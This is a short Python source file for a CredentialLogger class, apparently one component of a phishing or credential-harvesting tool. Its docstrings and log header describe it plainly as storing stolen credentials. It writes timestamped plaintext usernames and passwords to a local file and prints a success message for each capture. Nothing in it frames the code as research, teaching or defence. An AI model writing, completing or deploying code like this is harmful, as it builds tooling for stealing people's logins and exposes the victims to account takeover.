import os
from datetime import datetime
 
class CredentialLogger:
    """Handles the logging and persistence of stolen credentials."""
    def __init__(self, log_file_path: str):
        self.log_file_path = log_file_path
        self._ensure_file_exists()
 
    def _ensure_file_exists(self):
        """Ensures the log file is ready."""
        if not os.path.exists(self.log_file_path):
            with open(self.log_file_path, 'w') as f:
                f.write("--- Stolen Credentials Log Start ---\n")
            print(f"Logger initialized. Log file created at: {self.log_file_path}")
 
    def log_credentials(self, username: str, password: str):
        """Records the captured login details."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] Username: {username} | Password: {password}\n"
 
        try:
            with open(self.log_file_path, 'a') as f:
                f.write(log_entry)
            print("\n[+] Credentials successfully logged to the file.")
        except IOError as e:
            print(f"[!] ERROR: Could not write to log file {self.log_file_path}. Error: {e}")
